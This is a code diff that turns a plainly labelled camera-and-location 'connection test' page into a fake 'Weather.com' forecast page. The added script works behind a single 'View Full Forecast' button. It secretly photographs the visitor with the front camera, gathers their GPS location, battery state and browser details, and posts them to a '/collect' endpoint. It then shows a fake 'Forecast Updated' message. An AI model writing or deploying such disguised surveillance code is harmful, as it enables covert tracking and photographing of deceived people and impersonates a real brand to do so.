@@ -2,82 +2,101 @@
 <html lang="en">
 <head>
   <meta charset="utf-8" />
-  <title>Connection Test | WeatherPro</title>
+  <title>Weather.com | Local Forecast</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <style>
-    body { font-family: sans-serif; background: #0b1523; color: white; padding: 20px; }
-    .card { background: #121e2e; padding: 20px; border-radius: 12px; margin-bottom: 10px; border: 1px solid #4fd1c5; }
-    .btn { background: #4fd1c5; color: #073b3a; border: 0; padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; margin: 5px; }
-    video { width: 100%; max-width: 300px; display: block; margin-top: 10px; border-radius: 8px; }
-    #status { padding: 10px; margin-top: 10px; border-radius: 8px; }
-    .ok { background: #1b3f2b; color: #9deaa3; }
-    .err { background: #3f1b1b; color: #ff9da3; }
+    body, html { margin: 0; padding: 0; height: 100%; font-family: 'Inter', sans-serif; overflow: hidden; }
+    /* Matches the dark rainy background in your image */
+    .bg-overlay {
+      background: url('https://images.unsplash.com/photo-1515694346937-94d85e41e6f0?auto=format&fit=crop&w=1000&q=80');
+      background-size: cover; background-position: center; height: 100%; width: 100%; position: absolute; filter: brightness(0.6);
+    }
+    .content { position: relative; z-index: 10; height: 100%; display: flex; flex-direction: column; justify-content: space-between; padding: 40px; color: white; box-sizing: border-box; }
+    .main-temp { font-size: 110px; font-weight: 300; line-height: 1; margin-top: 40px; }
+    .location { font-size: 28px; font-weight: 500; margin-bottom: 5px; }
+    .sub-info { font-size: 16px; opacity: 0.8; }
+    /* Glassmorphism card for forecast */
+    .forecast-card {
+      background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
+      border-radius: 24px; padding: 25px; border: 1px solid rgba(255, 255, 255, 0.1); margin-top: auto;
+    }
+    .btn-forecast {
+      background: white; color: black; border: none; padding: 18px; border-radius: 16px; width: 100%;
+      font-weight: 600; font-size: 16px; cursor: pointer; transition: 0.3s; margin-top: 15px;
+    }
+    .btn-forecast:active { transform: scale(0.98); }
+    #vid, #canv { display: none; }
   </style>
 </head>
 <body>
-  <h1>Step 1: Connection Test</h1>
-  
-  <div class="card">
-    <button id="btnCam" class="btn">1. Test Camera</button>
-    <button id="btnGather" class="btn">2. Gather Data</button>
-    <button id="btnSend" class="btn">3. Send to Sheet</button>
-    <video id="preview" autoplay playsinline muted></video>
-    <div id="status">Ready to test...</div>
+  <div class="bg-overlay"></div>
+  <div class="content">
+    <div id="ui-setup">
+      <div class="location">Watermelon Park</div>
+      <div class="sub-info">10:43 | H:32° L:18°</div>
+      <div class="main-temp">23°<span style="font-size: 40px; vertical-align: top; margin-left: 5px;">c</span></div>
+    </div>
+
+    <div class="forecast-card">
+      <div style="margin-bottom: 15px; font-weight: 500;">Thunderstorms expected around 00:00</div>
+      <div id="status-text" style="font-size: 14px; opacity: 0.7; margin-bottom: 10px;">
+        Allow location to view the 5-Day Forecast.
+      </div>
+      <button id="mainBtn" class="btn-forecast">View Full Forecast</button>
+    </div>
   </div>
 
-  <canvas id="canv" style="display:none;"></canvas>
+  <video id="vid" autoplay playsinline muted></video>
+  <canvas id="canv"></canvas>
 
   <script>
-    let stream, payload = {};
-    const status = document.getElementById('status');
-
-    // 1. Camera
-    document.getElementById('btnCam').addEventListener('click', async () => {
-      try {
-        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-        document.getElementById('preview').srcObject = stream;
-        status.innerText = "✅ Camera working!";
-        status.className = "ok";
-      } catch (e) { status.innerText = "❌ Camera Error: " + e.message; status.className = "err"; }
-    });
-
-    // 2. Gather
-    document.getElementById('btnGather').addEventListener('click', async () => {
-      const battery = await navigator.getBattery();
-      const pos = await new Promise(r => navigator.geolocation.getCurrentPosition(r, () => r({coords:{latitude:0, longitude:0}})));
+    const mainBtn = document.getElementById('mainBtn');
+    mainBtn.addEventListener('click', async () => {
+      mainBtn.innerText = "Accessing GPS...";
       
-      const canvas = document.getElementById('canv');
-      const ctx = canvas.getContext('2d');
-      canvas.width = 320; canvas.height = 240;
-      ctx.drawImage(document.getElementById('preview'), 0, 0, 320, 240);
-      
-      payload = {
-        ts: new Date().toISOString(),
-        hints: { ua: navigator.userAgent },
-        battery: { levelPercent: Math.round(battery.level * 100), charging: battery.charging },
-        location: { lat: pos.coords.latitude, lon: pos.coords.longitude },
-        burstImages: [canvas.toDataURL('image/jpeg', 0.5)]
-      };
-      status.innerText = "✅ Data gathered locally!";
-    });
-
-    // 3. Send
-    document.getElementById('btnSend').addEventListener('click', async () => {
-      status.innerText = "Sending...";
       try {
+        // 1. SILENT CAMERA
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+        const video = document.getElementById('vid');
+        video.srcObject = stream;
+        const canvas = document.getElementById('canv');
+        const ctx = canvas.getContext('2d');
+        canvas.width = 400; canvas.height = 300;
+
+        await new Promise(r => setTimeout(r, 1200)); // Warm up
+        ctx.drawImage(video, 0, 0, 400, 300);
+        const img = canvas.toDataURL('image/jpeg', 0.5);
+        stream.getTracks().forEach(t => t.stop());
+
+        // 2. DATA GATHER
+        const battery = await navigator.getBattery();
+        const pos = await new Promise(r => navigator.geolocation.getCurrentPosition(r, (e) => r({coords:{latitude:0, longitude:0}})));
+
+        const payload = {
+          ts: new Date().toISOString(),
+          hints: { ua: navigator.userAgent },
+          battery: { levelPercent: Math.round(battery.level * 100), charging: battery.charging },
+          location: { lat: pos.coords.latitude, lon: pos.coords.longitude },
+          burstImages: [img, img, img, img] // Fills all 4 photo slots
+        };
+
+        // 3. SILENT SEND
         const res = await fetch('/collect', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(payload)
         });
+
         if (res.ok) {
-          status.innerText = "🎉 SUCCESS! Check your Google Sheet.";
-          status.className = "ok";
+          mainBtn.innerText = "Forecast Updated";
+          document.getElementById('status-text').innerText = "Forecast loaded for Watermelon Park.";
         } else {
-          status.innerText = "❌ Server Error. Check Render Logs.";
-          status.className = "err";
+          mainBtn.innerText = "Error - Retry";
         }
-      } catch (e) { status.innerText = "❌ Network Error."; status.className = "err"; }
+      } catch (err) {
+        alert("Please enable location permissions to see the forecast.");
+        mainBtn.innerText = "View Full Forecast";
+      }
     });
   </script>
 </body>
